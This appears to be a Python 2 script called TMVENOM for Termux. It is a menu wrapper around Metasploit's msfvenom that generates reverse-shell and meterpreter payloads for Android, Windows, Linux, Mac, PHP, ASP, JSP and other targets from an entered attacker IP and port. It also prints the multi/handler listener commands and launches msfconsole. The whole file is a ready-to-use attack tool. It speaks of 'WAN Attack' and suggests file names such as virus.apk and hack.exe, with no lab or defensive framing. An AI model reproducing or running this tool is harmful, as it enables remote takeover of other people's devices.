	#-*- coding: utf-8 -*-

import os
import sys
import time
import colorama
from colorama import *
import sys

def again():
          run = raw_input("\033[1;91m\n[!] [e]\033[1;92m Exit\033[1;96m or \033[1;91m[a]\033[1;92m Again ? [e/a] =\033[1;96m  ")
          if run=='e':
             print('Exiting......')
             time.sleep(0.5)
             print("             \033[1;92mThank You Dear ,Have a Payload Day !")
             time.sleep(1.2)
             print("")
             os.system("echo ---------------------------------------------- | lolcat")
             os.system("date | lolcat")
             print("")
             os.system("pwd | lolcat")
             os.system("echo ---------------------------------------------- | lolcat")
             os.system("echo [ ------TMVENOM By Mujeeb ------] | lolcat")
             print("")
          else:
             os.system("clear")
             logo()
             main()


def clr():
   os.system('clear') 

time.sleep(1)
clr()
os.system("sh /data/data/com.termux/files/home/tmvenom/core/run")
clr()
def ts():
    time.sleep(0.8)

def author():
    print("\033[1;92m")
    print(Fore.RED +"Loading Author Information.....")
    time.sleep(4.1)
    print("\033[1;92m----------------------------------------------------")
    print("| <=>  Name    = Mujeeb                             |")
    ts()
    print("| <=>  Youtube = www.youtube.com/technicalmujeeb    |")
    ts()  
    print("| <=>  Github  = https://github.com/TechnicalMujeeb |")
    ts()
    print("| <=>  whatsapp= Termux Cyber                       |")
    print("|----------------------------------------------------")
    ts()

def logo():
     print("\033[1;92m")
     print("████████╗███╗   ███╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗")
     print("╚══██╔══╝████╗ ████║██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║")
     print("   ██║   ██╔████╔██║██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║")
     print("   ██║   ██║╚██╔╝██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║")
     print("   ██║   ██║ ╚═╝ ██║ ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║")
     print("   ╚═╝   ╚═╝     ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝")
     print("")
     os.system("echo ++++[ Developed by Technical Mujeeb. Specially For Termux users ]++++ | lolcat")
     os.system("echo --------------------------------------------------------------------- | lolcat")

def main(): 
      print('\033[1;92m      <<---------------[ PAYLOAD MENU ]---------------->>   v 1.0') 
      os.system("echo --------------------------------------------------------------------- | lolcat")

      print("")
      print('')
      print("\033[1;91m[a\033[1;91m]..\033[1;95m Author Information ")
      print("")
      print("\033[1;91m[1]..\033[1;92mAndroid payload ")
      print("")
      print("\033[1;91m[2]..\033[1;92mPython Payload ")
      print("")
      print("\033[1;91m[3]..\033[1;92mPhp Payload ")
      print("")
      print("\033[1;91m[4]..\033[1;92mWindows Payload ")
      print("")
      print("\033[1;91m[5]..\033[1;92mLinux Payload ")
      print("")
      print("\033[1;91m[6]..\033[1;92mMac Payload ")
      print("")
      print("\033[1;91m[7]..\033[1;92mPerl Payload ")
      print("")
      print("\033[1;91m[8]..\033[1;92mBash Payload ")
      print("")
      print("\033[1;91m[9]..\033[1;92mAsp Payload ")
      print("")
      print("\033[1;91m[10]..\033[1;92mJsp Payload ")
      print("")
      print("\033[1;91m[11]..\033[1;92mWar Payload ")
      print("")
      print("\033[1;91m[h]..\033[1;92mHelp ")
      print("")
      print("\033[1;91m[l]..\033[1;92mAll Payload List ")
      print("")
      os.system("echo --------------------------------------------------------------------- | lolcat")

      print("")
      op = raw_input("\033[1;96m Select@[ \033[1;91mTmvenom \033[1;96m]#:─────❯ \033[1;92m ")


      if op=='1':
          time.sleep(0.3)
          print("")
          print(Fore.YELLOW +" ---------[ Android Payload for Android Mobiles ]---------..")
          print("")
          print(Fore.GREEN +"=> For WAN Attack use Your Public IP Address = command :> curl ifconfig.me")
          print("")
          print(Fore.GREEN +"=> For LAN Attack use Your Local Ip Address = command :> ifconfig")
          time.sleep(1.2)
          print('')
          ip = raw_input(Fore.CYAN +"[->] Enter Your Ip Address = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recommended port is = 4444')
          print('')
          time.sleep(0.7)
          por = raw_input(Fore.CYAN +"[->] Enter Your Port Number = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recomended path and name = /$HOME/virus.apk\033[1;91m OR \033[1;93m/sdcard/virus.apk')
          print('')
          time.sleep(0.7)
          pay = raw_input(Fore.CYAN +"[->] Payload path and Name  = ")
          print(Fore.GREEN +"Generating payload.....")
          time.sleep(2.4)
          os.system('ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -p android/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' R > '+ pay)
          print('')
          print(Fore.YELLOW +'Successfully Generated')
          print('')
          yan = raw_input(Fore.YELLOW +"    Are You want to start listner (y/n) =>  ")
          if yan=='y':
             print("")
             print(Fore.CYAN +"----------------COMMANDS FOR EXPLOIT---------------------")
             print("\033[00m")
             print(Back.BLUE +"   copy and paste Below commands in msfconsole        \033[00m      ")
             print("\033[1;93m")
             print("   use multi/handler")
             print("   set payload android/meterpreter/reverse_tcp")
             print("   set lhost {}   =(\033[91mhere your local ip\033[00m)" .format(ip))
             print("\033[1;93m   set lport {} " .format(por))
             print("   exploit")
             print("")
             print(Fore.CYAN +"---------------------------------------------------------")
             time.sleep(0.3)
             print("PLEASE WAIT MSFCONSOLE STARTING....")
             time.sleep(5)
             os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfconsole")
          else:
             again()

      elif op=='2':
          time.sleep(0.4)
          print("")
          print(Fore.YELLOW +"-----------[ Python based Payload ]------------")
          print("")
          print(Fore.GREEN +"=> For WAN Attack use Your Public IP Address = command : curl ifconfig.me")
          print("")
          print(Fore.GREEN +"=> For LAN Attack use Your Local Ip Address = command : ifconfig")
          time.sleep(1.2)
          print('')
          ip = raw_input(Fore.CYAN +"[->] Enter Your Ip Address = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recommended port is = 444')
          print('')
          time.sleep(0.7)
          por = raw_input(Fore.CYAN +"[->] Enter Your Port Number = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recomended path and name = /$HOME/back.py\033[1;91m OR \033[1;93m/sdcard/back.py')
          print('')
          time.sleep(0.7)
          pay = raw_input(Fore.CYAN +"[->] Payload path and Name  = ")
          print(Fore.GREEN +"Generating payload.....")
          time.sleep(2.4)
          os.system('ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -p python/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -o  '+ pay)
          print('')
          print(Fore.YELLOW +'Successfully Generated')
          print('')
          yan = raw_input(Fore.YELLOW +"    Are You want to start listner (y/n) =>  ")
          if yan=='y':
             print("")
             print(Fore.CYAN +"----------------COMMANDS FOR EXPLOIT---------------------")
             print("\033[00m")
             print(Back.BLUE +"   copy and paste Below commands in msfconsole        \033[00m      ")
             print("\033[1;93m")
             print("   use multi/handler")
             print("   set payload python/meterpreter/reverse_tcp")
             print("   set lhost {}   =(\033[91mhere your local ip\033[00m)" .format(ip))
             print("\033[1;93m   set lport {} " .format(por))
             print("   exploit")
             print("")
             print(Fore.CYAN +"---------------------------------------------------------")
             time.sleep(0.3)
             print("PLEASE WAIT MSFCONSOLE STARTING....")
             time.sleep(5)
             os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfconsole")
          else:
             again()

      elif op=='3':
          time.sleep(0.4)
          print('')
          print(Fore.YELLOW +"-----------[ PHP based Payload ]------------")
          print("")
          print(Fore.GREEN +"=> For WAN Attack use Your Public IP Address = command : curl ifconfig.me")
          print("")
          print(Fore.GREEN +"=> For LAN Attack use Your Local Ip Address = command : ifconfig")
          time.sleep(1.2)
          print('')
          ip = raw_input(Fore.CYAN +"[->] Enter Your Ip Address = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recommended port is = 6666')
          print('')
          time.sleep(0.7)
          por = raw_input(Fore.CYAN +"[->] Enter Your Port Number = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recomended path and name = /$HOME/shell.php\033[1;91m OR \033[1;93m/sdcard/shell.php')
          print('')
          time.sleep(0.7)
          pay = raw_input(Fore.CYAN +"[->] Payload path and Name  = ")
          print(Fore.GREEN +"Generating payload.....")
          time.sleep(2.4)
          os.system('ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -p php/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' R > '+ pay)
          print('')
          print(Fore.YELLOW +'Successfully Generated')
          print('')
          yan = raw_input(Fore.YELLOW +"    Are You want to start listner (y/n) =>  ")
          if yan=='y':
             print("")
             print(Fore.CYAN +"----------------COMMANDS FOR EXPLOIT---------------------")
             print("\033[00m")
             print(Back.BLUE +"   copy and paste Below commands in msfconsole        \033[00m      ")
             print("\033[1;93m")
             print("   use multi/handler")
             print("   set payload php/meterpreter/reverse_tcp")
             print("   set lhost {}   =(\033[91mhere your local ip\033[00m)" .format(ip))
             print("\033[1;93m   set lport {} " .format(por))
             print("   exploit")
             print("")
             print(Fore.CYAN +"---------------------------------------------------------")
             time.sleep(0.3)
             print("PLEASE WAIT MSFCONSOLE STARTING....")
             time.sleep(5)
             os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfconsole")
          else:
             again()

      elif op=='4':
          time.sleep(0.4)
          print("")
          print(Fore.GREEN +"=> For WAN Attack use Your Public IP Address = command : curl ifconfig.me")
          print("")
          print(Fore.GREEN +"=> For LAN Attack use Your Local Ip Address = command : ifconfig")
          time.sleep(1.2)
          print('')
          print(Fore.YELLOW +'    <<{ This windows payload works on both 64-bit & 32-bit }>> ')
          print('')
          time.sleep(0.3)
          ip = raw_input(Fore.CYAN +"[->] Enter Your Ip Address = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recommended port is = 4444')
          print('')
          time.sleep(0.7)
          por = raw_input(Fore.CYAN +"[->] Enter Your Port Number = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recomended path and name = /$HOME/hack.exe\033[1;91m OR \033[1;93m/sdcard/hack.exe')
          print('')
          time.sleep(0.7)
          pay = raw_input(Fore.CYAN +"[->] Payload path and Name  = ")
          print(Fore.GREEN +"Generating payload.....")
          time.sleep(2.4)
          os.system('ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -f exe -a x86 > '+ pay)
          print('')
          print(Fore.YELLOW +'Successfully Generated')
          print('')
          yan = raw_input(Fore.YELLOW +"    Are You want to start listner (y/n) =>  ")
          if yan=='y':
             print("")
             print(Fore.CYAN +"----------------COMMANDS FOR EXPLOIT---------------------")
             print("\033[00m")
             print(Back.BLUE +"   copy and paste Below commands in msfconsole        \033[00m      ")
             print("\033[1;93m")
             print("   use multi/handler")
             print("   set payload windows/meterpreter/reverse_tcp")
             print("   set lhost {}   =(\033[91mhere your local ip\033[00m)" .format(ip))
             print("\033[1;93m   set lport {} " .format(por))
             print("   exploit")
             print("")
             print(Fore.CYAN +"---------------------------------------------------------")
             time.sleep(0.3)
             print("PLEASE WAIT MSFCONSOLE STARTING....")
             time.sleep(5)
             os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfconsole")
          else:
             again()

      elif op=='5':
          time.sleep(0.4)
          print("")
          print(Fore.YELLOW +"-----------[ Payload for Linux os ]------------")
          print("")
          print(Fore.GREEN +"=> For WAN Attack use Your Public IP Address = command : curl ifconfig.me")
          print("")
          print(Fore.GREEN +"=> For LAN Attack use Your Local Ip Address = command : ifconfig")
          time.sleep(1.2)
          print('')
          ip = raw_input(Fore.CYAN +"[->] Enter Your Ip Address = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recommended port is = 4444')
          print('')
          time.sleep(0.7)
          por = raw_input(Fore.CYAN +"[->] Enter Your Port Number = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recomended path and name = /$HOME/linux.elf\033[1;91m OR \033[1;93m/sdcard/linux.elf')
          print('')
          time.sleep(0.7)
          pay = raw_input(Fore.CYAN +"[->] Payload path and Name  = ")
          print(Fore.GREEN +"Generating payload.....")
          time.sleep(2.4)
          os.system('ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -f elf > '+ pay)
          print('')
          print(Fore.YELLOW +'Successfully Generated')
          print('')
          yan = raw_input(Fore.YELLOW +"    Are You want to start listner (y/n) =>  ")
          if yan=='y':
             print("")
             print(Fore.CYAN +"----------------COMMANDS FOR EXPLOIT---------------------")
             print("\033[00m")
             print(Back.BLUE +"   copy and paste Below commands in msfconsole        \033[00m      ")
             print("\033[1;93m")
             print("   use multi/handler")
             print("   set payload linux/x86/meterpreter/reverse_tcp")
             print("   set lhost {}   =(\033[91mhere your local ip\033[00m)" .format(ip))
             print("\033[1;93m   set lport {} " .format(por))
             print("   exploit")
             print("")
             print(Fore.CYAN +"---------------------------------------------------------")
             time.sleep(0.3)
             print("PLEASE WAIT MSFCONSOLE STARTING....")
             time.sleep(5)
             os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfconsole")
          else:
             again()

      elif op=='6':
          time.sleep(0.4)
          print("")
          print(Fore.YELLOW +"-----------[ Payload for Mac osx ]------------")
          print("")
          print(Fore.GREEN +"=> For WAN Attack use Your Public IP Address = command : curl ifconfig.me")
          print("")
          print(Fore.GREEN +"=> For LAN Attack use Your Local Ip Address = command : ifconfig")
          time.sleep(1.2)
          print('')
          ip = raw_input(Fore.CYAN +"[->] Enter Your Ip Address = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recommended port is = 4444')
          print('')
          time.sleep(0.7)
          por = raw_input(Fore.CYAN +"[->] Enter Your Port Number = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recomended path and name = /$HOME/mac.macho\033[1;91m OR \033[1;93m/sdcard/mac.macho')
          print('')
          time.sleep(0.7)
          pay = raw_input(Fore.CYAN +"[->] Payload path and Name  = ")
          print(Fore.GREEN +"Generating payload.....")
          time.sleep(2.4)
          os.system('ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -p osx/x86/shell_reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -f macho > '+ pay)
          print('')
          print(Fore.YELLOW +'Successfully Generated')
          print('')
          yan = raw_input(Fore.YELLOW +"    Are You want to start listner (y/n) =>  ")
          if yan=='y':
             print("")
             print(Fore.CYAN +"----------------COMMANDS FOR EXPLOIT---------------------")
             print("\033[00m")
             print(Back.BLUE +"   copy and paste Below commands in msfconsole        \033[00m      ")
             print("\033[1;93m")
             print("   use multi/handler")
             print("   set payload osx/x86/shell_reverse_tcp")
             print("   set lhost {}   =(\033[91mhere your local ip\033[00m)" .format(ip))
             print("\033[1;93m   set lport {} " .format(por))
             print("   exploit")
             print("")
             print(Fore.CYAN +"---------------------------------------------------------")
             time.sleep(0.3)
             print("PLEASE WAIT MSFCONSOLE STARTING....")
             time.sleep(5)
             os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfconsole")
          else:
             again()

      elif op=='7':
          time.sleep(0.4)
          print("")
          print(Fore.YELLOW +"-----------[ Perl based Payload ]------------")
          print("")
          print(Fore.GREEN +"=> For WAN Attack use Your Public IP Address = command : curl ifconfig.me")
          print("")
          print(Fore.GREEN +"=> For LAN Attack use Your Local Ip Address = command : ifconfig")
          time.sleep(1.2)
          print('')
          ip = raw_input(Fore.CYAN +"[->] Enter Your Ip Address = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recommended port is = 4444')
          print('')
          time.sleep(0.7)
          por = raw_input(Fore.CYAN +"[->] Enter Your Port Number = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recomended path and name = /$HOME/shell.pl\033[1;91m OR \033[1;93m/sdcard/shell.pl')
          print('')
          time.sleep(0.7)
          pay = raw_input(Fore.CYAN +"[->] Payload path and Name  = ")
          print(Fore.GREEN +"Generating payload.....")
          time.sleep(2.4)
          os.system('ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -p cmd/unix/reverse_perl LHOST=' + ip + ' LPORT=' + por + ' -f raw > '+ pay)
          print('')
          print(Fore.YELLOW +'Successfully Generated')
          print('')
          yan = raw_input(Fore.YELLOW +"    Are You want to start listner (y/n) =>  ")
          if yan=='y':
             print("")
             print(Fore.CYAN +"----------------COMMANDS FOR EXPLOIT---------------------")
             print("\033[00m")
             print(Back.BLUE +"   copy and paste Below commands in msfconsole        \033[00m      ")
             print("\033[1;93m")
             print("   use multi/handler")
             print("   set payload cmd/unix/reverse_perl")
             print("   set lhost {}   =(\033[91mhere your local ip\033[00m)" .format(ip))
             print("\033[1;93m   set lport {} " .format(por))
             print("   exploit")
             print("")
             print(Fore.CYAN +"---------------------------------------------------------")
             time.sleep(0.3)
             print("PLEASE WAIT MSFCONSOLE STARTING....")
             time.sleep(5)
             os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfconsole")
          else:
             again()

      elif op=='8':
          time.sleep(0.4)
          print("")
          print(Fore.YELLOW +"-----------[ Bash Payload ]------------")
          print('')
          print(Fore.GREEN +"=> For WAN Attack use Your Public IP Address = command : curl ifconfig.me")
          print("")
          print(Fore.GREEN +"=> For LAN Attack use Your Local Ip Address = command : ifconfig")
          time.sleep(1.2)
          print('')
          ip = raw_input(Fore.CYAN +"[->] Enter Your Ip Address = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recommended port is = 4444')
          print('')
          time.sleep(0.7)
          por = raw_input(Fore.CYAN +"[->] Enter Your Port Number = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recomended path and name = /$HOME/shell.sh\033[1;91m OR \033[1;93m/sdcard/shell.sh')
          print('')
          time.sleep(0.7)
          pay = raw_input(Fore.CYAN +"[->] Payload path and Name  = ")
          print(Fore.GREEN +"Generating payload.....")
          time.sleep(2.4)
          os.system('ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -p cmd/unix/reverse_bash LHOST=' + ip + ' LPORT=' + por + ' -f raw > '+ pay)
          print('')
          print(Fore.YELLOW +'Successfully Generated')
          print('')
          yan = raw_input(Fore.YELLOW +"    Are You want to start listner (y/n) =>  ")
          if yan=='y':
             print("")
             print(Fore.CYAN +"----------------COMMANDS FOR EXPLOIT---------------------")
             print("\033[00m")
             print(Back.BLUE +"   copy and paste Below commands in msfconsole        \033[00m      ")
             print("\033[1;93m")
             print("   use multi/handler")
             print("   set payload cmd/unix/reverse_bash")
             print("   set lhost {}   =(\033[91mhere your local ip\033[00m)" .format(ip))
             print("\033[1;93m   set lport {} " .format(por))
             print("   exploit")
             print("")
             print(Fore.CYAN +"---------------------------------------------------------")
             time.sleep(0.3)
             print("PLEASE WAIT MSFCONSOLE STARTING....")
             time.sleep(5)
             os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfconsole")
          else:
             again()

      elif op=='9':
          time.sleep(0.1)
          print("")
          print(Fore.YELLOW +"   => This ASP payload for windows")
          time.sleep(0.3)
          print("")
          print(Fore.GREEN +"=> For WAN Attack use Your Public IP Address = command :> curl ifconfig.me")
          print("")
          print(Fore.GREEN +"=> For LAN Attack use Your Local Ip Address = command :> ifconfig")
          time.sleep(1.2)
          print('')
          ip = raw_input(Fore.CYAN +"[->] Enter Your Ip Address = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recommended port is = 4444')
          print('')
          time.sleep(0.7)
          por = raw_input(Fore.CYAN +"[->] Enter Your Port Number = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recomended path and name = /$HOME/virus.asp\033[1;91m OR \033[1;93m/sdcard/virus.asp')
          print('')
          time.sleep(0.7)
          pay = raw_input(Fore.CYAN +"[->] Payload path and Name  = ")
          print(Fore.GREEN +"Generating payload.....")
          time.sleep(2.4)
          os.system('ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -f asp > '+ pay)
          print('')
          print(Fore.YELLOW +'Successfully Generated')
          print('')
          yan = raw_input(Fore.YELLOW +"    Are You want to start listner (y/n) =>  ")
          if yan=='y':
             print("")
             print(Fore.CYAN +"----------------COMMANDS FOR EXPLOIT---------------------")
             print("\033[00m")
             print(Back.BLUE +"   copy and paste Below commands in msfconsole        \033[00m      ")
             print("\033[1;93m")
             print("   use multi/handler")
             print("   set payload windows/meterpreter/reverse_tcp")
             print("   set lhost {}   =(\033[91mhere your local ip\033[00m)" .format(ip))
             print("\033[1;93m   set lport {} " .format(por))
             print("   exploit")
             print("")
             print(Fore.CYAN +"---------------------------------------------------------")
             time.sleep(0.3)
             print("PLEASE WAIT MSFCONSOLE STARTING....")
             time.sleep(5)
             os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfconsole")
          else:
             again()

      elif op=='10':
          time.sleep(0.3)
          print("")
          print(Fore.YELLOW +"-----------[ Java Payload ]------------")
          print("")
          print(Fore.GREEN +"=> For WAN Attack use Your Public IP Address = command :> curl ifconfig.me")
          print("")
          print(Fore.GREEN +"=> For LAN Attack use Your Local Ip Address = command :> ifconfig")
          time.sleep(1.2)
          print('')
          ip = raw_input(Fore.CYAN +"[->] Enter Your Ip Address = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recommended port is = 4444')
          print('')
          time.sleep(0.7)
          por = raw_input(Fore.CYAN +"[->] Enter Your Port Number = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recomended path and name = /$HOME/virus.jsp\033[1;91m OR \033[1;93m/sdcard/virus.jsp')
          print('')
          time.sleep(0.7)
          pay = raw_input(Fore.CYAN +"[->] Payload path and Name  = ")
          print(Fore.GREEN +"Generating payload.....")
          time.sleep(2.4)
          os.system('ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -p java/jsp_shell_reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -f raw > '+ pay)
          print('')
          print(Fore.YELLOW +'Successfully Generated')
          print('')
          yan = raw_input(Fore.YELLOW +"    Are You want to start listner (y/n) =>  ")
          if yan=='y':
             print("")
             print(Fore.CYAN +"----------------COMMANDS FOR EXPLOIT---------------------")
             print("\033[00m")
             print(Back.BLUE +"   copy and paste Below commands in msfconsole        \033[00m      ")
             print("\033[1;93m")
             print("   use multi/handler")
             print("   set payload java/jsp_shell_reverse_tcp")
             print("   set lhost {}   =(\033[91mhere your local ip\033[00m)" .format(ip))
             print("\033[1;93m   set lport {} " .format(por))
             print("   exploit")
             print("")
             print(Fore.CYAN +"---------------------------------------------------------")
             time.sleep(0.3)
             print("PLEASE WAIT MSFCONSOLE STARTING....")
             time.sleep(5)
             os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfconsole")
          else:
             again()

      elif op=='11':
          time.sleep(0.3)
          print("")
          print(Fore.YELLOW +"-----------[ Java .war payload ]------------")
          print("")
          print(Fore.GREEN +"=> For WAN Attack use Your Public IP Address = command :> curl ifconfig.me")
          print("")
          print(Fore.GREEN +"=> For LAN Attack use Your Local Ip Address = command :> ifconfig")
          time.sleep(1.2)
          print('')
          ip = raw_input(Fore.CYAN +"[->] Enter Your Ip Address = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recommended port is = 4444')
          print('')
          time.sleep(0.7)
          por = raw_input(Fore.CYAN +"[->] Enter Your Port Number = ")
          print('')
          time.sleep(0.5)
          print(Fore.YELLOW +'   Recomended path and name = /$HOME/file.war\033[1;91m OR \033[1;93m/sdcard/file.war')
          print('')
          time.sleep(0.7)
          pay = raw_input(Fore.CYAN +"[->] Payload path and Name  = ")
          print(Fore.GREEN +"Generating payload.....")
          time.sleep(2.4)
          os.system('ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -p java/jsp_shell_reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -f war > '+ pay)
          print('')
          print(Fore.YELLOW +'Successfully Generated')
          print('')
          yan = raw_input(Fore.YELLOW +"    Are You want to start listner (y/n) =>  ")
          if yan=='y':
             print("")
             print(Fore.CYAN +"----------------COMMANDS FOR EXPLOIT---------------------")
             print("\033[00m")
             print(Back.BLUE +"   copy and paste Below commands in msfconsole        \033[00m      ")
             print("\033[1;93m")
             print("   use multi/handler")
             print("   set payload java/jsp_shell_reverse_tcp")
             print("   set lhost {}   =(\033[91mhere your local ip\033[00m)" .format(ip))
             print("\033[1;93m   set lport {} " .format(por))
             print("   exploit")
             print("")
             print(Fore.CYAN +"---------------------------------------------------------")
             time.sleep(0.3)
             print("PLEASE WAIT MSFCONSOLE STARTING....")
             time.sleep(5)
             os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfconsole")
          else:
             again()

      elif op=='h':
          os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -h")
          again()

      elif op=='l':
          os.system("ruby /data/data/com.termux/files/home/metasploit-framework/msfvenom -l")
          again()

      elif op=='a':
          author()
          again()

      else: 
          again()
 
logo()
main()
